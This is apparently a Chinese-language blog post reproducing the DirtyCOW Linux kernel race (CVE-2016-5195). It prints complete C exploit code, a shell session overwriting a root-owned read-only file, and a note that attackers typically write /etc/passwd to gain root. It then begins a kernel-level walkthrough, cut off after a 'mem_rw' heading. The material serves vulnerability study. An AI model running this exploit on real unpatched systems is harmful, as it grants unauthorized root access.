<!DOCTYPE html>
<html lang="en-gb"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">CVE-2016-5195 DirtyCOW | a39&#39;s blog</title>
<meta property="og:title" content="CVE-2016-5195 DirtyCOW | a39&#39;s blog" />
<meta name="twitter:title" content="CVE-2016-5195 DirtyCOW | a39&#39;s blog" />
<meta itemprop="name" content="CVE-2016-5195 DirtyCOW | a39&#39;s blog" />
<meta name="application-name" content="CVE-2016-5195 DirtyCOW | a39&#39;s blog" />
<meta property="og:site_name" content="Awesome hugo blog" />

<meta name="description" content="CVE-2016-5195 DirtyCOW 脏牛漏洞复现">
<meta itemprop="description" content="CVE-2016-5195 DirtyCOW 脏牛漏洞复现" />
<meta property="og:description" content="CVE-2016-5195 DirtyCOW 脏牛漏洞复现" />
<meta name="twitter:description" content="CVE-2016-5195 DirtyCOW 脏牛漏洞复现" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="https://asuka39.github.io/posts/2024-04-04-dirtycow/" title="English" />



  <meta itemprop="image" content="https://asuka39.github.io/" />
  <meta property="og:image" content="https://asuka39.github.io/" />
  <meta name="twitter:image" content="https://asuka39.github.io/" />
  <meta name="twitter:image:src" content="https://asuka39.github.io/" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-04-04T00:00:00Z />
    <meta property="article:published_time" content=2024-04-04T00:00:00Z />

    
    <meta property="og:article:author" content="A39" />
    <meta property="article:author" content="A39" />
    <meta name="author" content="A39" />
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "CVE-2016-5195 DirtyCOW",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-04-04",
        "description": "CVE-2016-5195 DirtyCOW 脏牛漏洞复现",
        "wordCount":  3558 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-04-04",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "a39\u0027s blog"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.124.1">

    

    <link rel="canonical" href="https://asuka39.github.io/posts/2024-04-04-dirtycow/">
    <link href="/style.min.5029572b12b24c4a875edd2f222bf10b3ff50b930fbfeb59c2602dc9eefff111.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/favicon.ico">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon.ico">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon.ico">
    <link rel="mask-icon" href="/icons/favicon.ico">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://asuka39.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    <meta name="google-site-verification" content="OBu2RkZZmMk9xXDviEo5asuAjsd_8wa5j_4Ii17jFEU" />

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://asuka39.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/about/">
                        About
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/friends/">
                        Friends
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">CVE-2016-5195 DirtyCOW</h1>
                
                
                <div class="post-meta">
                    <time datetime="2024-04-04T00:00:00&#43;00:00" itemprop="datePublished"> 4 Apr 2024 </time>
                </div>
                
            </header>
            
    
    <details class="toc" ZgotmplZ>
        <summary><b>Table of Contents</b></summary>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#poc">PoC</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#exploit-analysis">Exploit Analysis</a></li>
        <li><a href="#kernel-analysis">Kernel Analysis</a>
          <ul>
            <li><a href="#what-happens-when-we-write">What happens when we write</a></li>
            <li><a href="#dirtycow">DirtyCOW</a></li>
            <li><a href="#dive-into-page-fault">Dive into Page Fault</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#reference">Reference</a></li>
  </ul>
</nav>
    </details>
            <div class="page-content">
                <h2 id="poc">PoC</h2>
<ul>
<li>修改自<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c">dirtycow.github.io</a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">madviseThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">str</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100000000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">c</span> <span class="o">+=</span> <span class="nf">madvise</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">MADV_DONTNEED</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;madvise %d</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">procselfmemThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">str</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/mem&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100000000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">lseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">map</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">c</span> <span class="o">+=</span> <span class="nf">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;procselfmem %d</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;usage: dirtyc0w target_file new_content&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kt">pthread_t</span> <span class="n">pth1</span><span class="p">,</span> <span class="n">pth2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fstat</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">name</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">map</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;mmap %zx</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">madviseThread</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">procselfmemThread</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_join</span><span class="p">(</span><span class="n">pth1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_join</span><span class="p">(</span><span class="n">pth2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">sudo</span> <span class="n">su</span>
</span></span><span class="line"><span class="cl"><span class="cp"># echo &#34;READ ONLY&#34; &gt; flag.txt
</span></span></span><span class="line"><span class="cl"><span class="cp"># chmod 0404 flag.txt
</span></span></span><span class="line"><span class="cl"><span class="cp"># exit
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="err">$</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ll</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span> 
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">10</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">echo</span> <span class="s">&#34;aaaaaa&#34;</span> <span class="o">&gt;</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">Permission</span> <span class="n">Denied</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">pthread</span> <span class="n">dirty</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">dirty</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">dirty</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span> <span class="n">aaaaaa</span>
</span></span><span class="line"><span class="cl"><span class="n">mmap</span> <span class="mf">7f</span><span class="mi">1</span><span class="n">a35bc4000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">procselfmem</span> <span class="o">-</span><span class="mi">2094967296</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">madvise</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">aaaaaa</span>
</span></span></code></pre></div><p>比较常见的利用手法是越权写<code>/etc/passwd</code>修改 root 用户或修改用户权限来提权</p>
<h2 id="analysis">Analysis</h2>
<h3 id="exploit-analysis">Exploit Analysis</h3>
<p>先来看看 exp 做了什么</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="s">&#34;usage: dirtyc0w target_file new_content&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="kt">pthread_t</span> <span class="n">pth1</span><span class="p">,</span> <span class="n">pth2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fstat</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">name</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">map</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;mmap %zx</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">madviseThread</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">procselfmemThread</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_join</span><span class="p">(</span><span class="n">pth1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pthread_join</span><span class="p">(</span><span class="n">pth2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><ul>
<li>首先调 pthread 建两个线程</li>
<li>然后<code>fopen</code>打开只读的目标文件<code>argv[1]</code></li>
<li>将文件<code>mmap</code>到内存（地址随机），<code>MAP_PRIVATE</code>的作用是建立一个 Task 私有的内存映射，如果有别的 Task 尝试写入这篇内存，该进程在写入前会先复制出一份拷贝再进行写入，从而在实现在起子进程或起线程时无需花费大量时间空间拷贝整个内存空间，又能保证 Task 间的并发内存操作互不影响，这就是 CopyOnWrite</li>
<li>随后启动两个线程，一个执行<code>madviseThread</code>，一个执行<code>procselfmemThread</code></li>
</ul>
<p>然后看看两个线程的执行体</p>
<ul>
<li>一个线程对文件映射调用<code>madvise</code>告诉内核映射的内存或者共享内存的使用情况，<code>MADV_DONTNEED</code>表示接下来不再使用这块内存区域，内核可以释放它</li>
<li>另一个线程以读写权限打开<code>/proc/self/mem</code>，这个文件是进程自身的虚拟内存的文件映射，然后不断尝试向文件写入目标信息</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">madviseThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">str</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100000000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">c</span> <span class="o">+=</span> <span class="nf">madvise</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">MADV_DONTNEED</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;madvise %d</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">procselfmemThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">str</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/mem&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100000000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">lseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">map</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">c</span> <span class="o">+=</span> <span class="nf">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;procselfmem %d</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>最终，在两个线程的轮番轰炸下内核出现竞争漏洞，<code>procselfmemThread</code>成功写入只读文件</p>
<h3 id="kernel-analysis">Kernel Analysis</h3>
<ul>
<li>大前提：<code>mmap</code>只会在 vma 上建立内存映射，但不会真的将映射文件放进物理页框。因此当我们第一次尝试<code>write</code>文件时必然会触发缺页异常</li>
<li>这里选择的 kernel 版本是 4.4</li>
</ul>
<h4 id="what-happens-when-we-write">What happens when we write</h4>
<h5 id="mem_rw">mem_rw</h5>
